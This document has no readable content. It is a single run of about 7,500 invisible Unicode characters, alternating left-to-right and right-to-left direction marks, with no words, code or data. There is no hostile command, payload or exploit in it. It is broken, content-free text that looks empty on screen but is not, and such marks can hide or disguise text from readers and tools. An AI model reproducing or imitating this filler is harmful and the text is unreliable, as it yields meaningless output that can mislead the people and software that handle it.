‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏